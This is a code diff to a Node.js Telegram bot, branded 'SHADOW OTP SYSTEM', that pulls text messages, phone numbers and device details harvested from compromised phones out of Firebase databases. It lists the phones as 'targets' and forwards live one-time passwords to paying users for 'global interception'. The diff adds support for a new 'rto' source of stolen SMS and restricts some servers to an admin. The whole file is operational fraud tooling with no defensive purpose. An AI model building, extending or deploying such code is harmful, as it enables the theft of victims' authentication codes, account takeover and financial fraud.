@@ -43,7 +43,7 @@ const rawServers = require('./servers.json');
 const uniqueServers = [];
 const seenUrls = new Set();
 rawServers.forEach(srv => {
-    if ((srv.type === 'std' || srv.type === 'v2') && !seenUrls.has(srv.url)) {
+    if ((srv.type === 'std' || srv.type === 'v2' || srv.type === 'rto') && !seenUrls.has(srv.url)) {
         seenUrls.add(srv.url);
         uniqueServers.push(srv);
     }
@@ -55,7 +55,8 @@ const servers = uniqueServers.map((srv, i) => {
         name: srv.label,
         url: srv.url,
         path: srv.path,
-        type: srv.type
+        type: srv.type,
+        adminOnly: srv.adminOnly || false
     };
 });
 
@@ -167,9 +168,15 @@ async function getDeviceNumbers(db, server, deviceId) {
             const snap = await getWithTimeout(ref(db, `user_data/${deviceId}`), 1500);
             if (snap.exists()) {
                 const info = snap.val();
-                if (info.phoneNumber) return info.phoneNumber;
-                if (info.Device_info) return info.Device_info.split('\n')[0];
+                let display = info.phoneNumber || "Unknown";
+                if (info.Device_info) {
+                    let model = info.Device_info.split('\n')[0].replace('Model: ', '').trim();
+                    display += ` (${model})`;
+                }
+                return display;
             }
+        } else if (server.type === 'rto') {
+            return deviceId;
         } else {
             const snap = await getWithTimeout(ref(db, `${server.path}/SimINFO/${deviceId}`), 1500);
             if (snap.exists()) {
@@ -186,10 +193,11 @@ async function getDeviceNumbers(db, server, deviceId) {
     return "Unknown Number"; 
 }
 
-function getServerMenu() {
+function getServerMenu(chatId) {
     let kb = [];
     let row = [];
     servers.forEach((s) => {
+        if (s.adminOnly && chatId !== usersDB.adminId) return;
         row.push({ text: s.name, callback_data: `sel_${s.id}` });
         if (row.length === 3) { kb.push(row); row = []; }
     });
@@ -208,13 +216,14 @@ function chunkArray(array, size) {
     return chunked;
 }
 
-async function fetchAllNumbersFromAllServers() {
+async function fetchAllNumbersFromAllServers(chatId) {
     let allButtons = [];
     const promises = servers.map(async (server) => {
+        if (server.adminOnly && chatId !== usersDB.adminId) return;
         const db = dbs[server.id];
         if (!db) return;
         try {
-            const basePath = server.type === 'v2' ? 'user_sms' : `${server.path}/Sms`;
+            const basePath = server.type === 'v2' ? 'user_sms' : (server.type === 'rto' ? (server.path || 'All_Users/sms') : `${server.path}/Sms`);
             const snapshot = await getWithTimeout(ref(db, basePath), 1500);
             if (snapshot.exists()) {
                 const deviceIds = Object.keys(snapshot.val());
@@ -237,7 +246,7 @@ async function sendServerNumbers(chatId, serverId, serverName) {
         const db = dbs[serverId];
         if (!db) return bot.sendMessage(chatId, "Database not found for " + serverName);
         
-        const basePath = server.type === 'v2' ? 'user_sms' : `${server.path}/Sms`;
+        const basePath = server.type === 'v2' ? 'user_sms' : (server.type === 'rto' ? (server.path || 'All_Users/sms') : `${server.path}/Sms`);
         const snapshot = await getWithTimeout(ref(db, basePath), 1500);
         if (snapshot.exists()) {
             const deviceIds = Object.keys(snapshot.val());
@@ -366,7 +375,7 @@ bot.onText(/\/start/, (msg) => {
     bot.sendMessage(chatId, "⚡️ <b>SHADOW OTP SYSTEM</b> ⚡️\n━━━━━━━━━━━━━━━━━━\nWelcome to the premium dashboard. Please select a server to monitor, or choose <b>ALL SHADOWS</b> for global interception.", { 
         parse_mode: 'HTML',
         reply_markup: {
-            inline_keyboard: getServerMenu()
+            inline_keyboard: getServerMenu(chatId)
         }
     });
 });
@@ -381,7 +390,7 @@ bot.onText(/\/all/, async (msg) => {
     
     bot.sendMessage(chatId, "⏳ <i>Initializing Global Intercept Mode...</i>", { parse_mode: 'HTML' });
     
-    const allButtons = await fetchAllNumbersFromAllServers();
+    const allButtons = await fetchAllNumbersFromAllServers(chatId);
     if (allButtons.length > 0) {
         bot.sendMessage(chatId, "🌐 <b>GLOBAL MODE ACTIVATED</b>\n━━━━━━━━━━━━━━━━━━\nAapko sabhi servers ke live OTPs real-time mein milenge.", { parse_mode: 'HTML' });
         sendChunkedKeyboards(chatId, allButtons, "📱 <b>AVAILABLE TARGETS:</b>");
@@ -410,7 +419,7 @@ bot.on('callback_query', async (query) => {
         
         if (srvId === 'ALL') {
             bot.sendMessage(chatId, "⏳ <i>Initializing Global Intercept Mode...</i>", { parse_mode: 'HTML' });
-            const allButtons = await fetchAllNumbersFromAllServers();
+            const allButtons = await fetchAllNumbersFromAllServers(chatId);
             bot.sendMessage(chatId, "🌐 <b>GLOBAL MODE ACTIVATED</b>\n━━━━━━━━━━━━━━━━━━\nAapko sabhi servers ke live OTPs real-time mein milenge.", { parse_mode: 'HTML' });
             if (allButtons.length > 0) {
                 sendChunkedKeyboards(chatId, allButtons, "📱 <b>AVAILABLE TARGETS:</b>");
@@ -419,6 +428,9 @@ bot.on('callback_query', async (query) => {
             }
         } else {
             const server = servers.find(s => s.id === srvId);
+            if (server.adminOnly && chatId !== usersDB.adminId) {
+                return bot.sendMessage(chatId, "⚠️ <b>ACCESS DENIED</b>\nYou do not have permission to access this server.", { parse_mode: 'HTML' });
+            }
             bot.sendMessage(chatId, `⏳ <i>Connecting to ${server.name}...</i>`, { parse_mode: 'HTML' });
             bot.sendMessage(chatId, `🎯 <b>TARGET LOCKED: ${server.name}</b>\n━━━━━━━━━━━━━━━━━━\nAb aapko sirf ${server.name} ke live OTPs milenge.`, { parse_mode: 'HTML' });
             await sendServerNumbers(chatId, server.id, server.name);
@@ -433,18 +445,18 @@ bot.on('callback_query', async (query) => {
             const server = servers.find(s => s.id === srvId);
             const db = dbs[srvId];
             const deviceNum = await getDeviceNumbers(db, server, deviceId);
-            const basePath = server.type === 'v2' ? `user_sms/${deviceId}` : `${server.path}/Sms/${deviceId}`;
+            const basePath = server.type === 'v2' ? `user_sms/${deviceId}` : (server.type === 'rto' ? `${server.path || 'All_Users/sms'}/${deviceId}` : `${server.path}/Sms/${deviceId}`);
             const snapshot = await getWithTimeout(ref(db, basePath), 4000);
             
             if (snapshot.exists()) {
                 const messages = snapshot.val();
                 let allMsgs = [];
                 for (const [msgId, msgData] of Object.entries(messages)) {
-                    if (server.type === 'v2' && msgData && msgData.body) {
+                    if ((server.type === 'v2' || server.type === 'rto') && msgData && msgData.body) {
                         allMsgs.push({
                             msg: msgData.body,
                             ph: msgData.sender,
-                            date: parseInt(msgData.timestamp || 0)
+                            date: msgData.timestamp ? parseInt(msgData.timestamp) : (msgData.receivedDate ? new Date(msgData.receivedDate).getTime() : 0)
                         });
                     } else if (msgData && msgData.msg) {
                         allMsgs.push({
@@ -487,7 +499,7 @@ async function setupLiveListeners() {
         if (!db) return;
         
         try {
-            const basePath = server.type === 'v2' ? 'user_sms' : `${server.path}/Sms`;
+            const basePath = server.type === 'v2' ? 'user_sms' : (server.type === 'rto' ? (server.path || 'All_Users/sms') : `${server.path}/Sms`);
             const devicesRef = ref(db, basePath);
             
             // Just attach onChildAdded, it triggers for all existing devices and future ones
@@ -500,7 +512,7 @@ async function setupLiveListeners() {
 }
 
 function attachListenerToDevice(db, server, deviceId) {
-    const basePath = server.type === 'v2' ? `user_sms/${deviceId}` : `${server.path}/Sms/${deviceId}`;
+    const basePath = server.type === 'v2' ? `user_sms/${deviceId}` : (server.type === 'rto' ? `${server.path || 'All_Users/sms'}/${deviceId}` : `${server.path}/Sms/${deviceId}`);
     const msgsRef = ref(db, basePath);
     const latestQuery = query(msgsRef, limitToLast(1));
     
@@ -509,10 +521,10 @@ function attachListenerToDevice(db, server, deviceId) {
         const msgData = msgSnapshot.val();
         
         let msgText, msgPh, msgDate;
-        if (server.type === 'v2' && msgData && msgData.body) {
+        if ((server.type === 'v2' || server.type === 'rto') && msgData && msgData.body) {
             msgText = msgData.body;
             msgPh = msgData.sender;
-            msgDate = parseInt(msgData.timestamp || 0);
+            msgDate = msgData.timestamp ? parseInt(msgData.timestamp) : (msgData.receivedDate ? new Date(msgData.receivedDate).getTime() : 0);
         } else if (msgData && msgData.msg) {
             msgText = msgData.msg;
             msgPh = msgData.ph;
@@ -537,6 +549,7 @@ function attachListenerToDevice(db, server, deviceId) {
                 // Broadcast to all authorized users subscribed to this server
                 for (const [uid, data] of Object.entries(usersDB.users)) {
                     if (isAuthorized(uid)) {
+                        if (server.adminOnly && uid !== usersDB.adminId) continue;
                         if (data.activeServerMode === 'ALL' || data.activeServerMode === server.id) {
                             bot.sendMessage(uid, alertMsg, { parse_mode: 'HTML' }).catch(e => {});
                         }
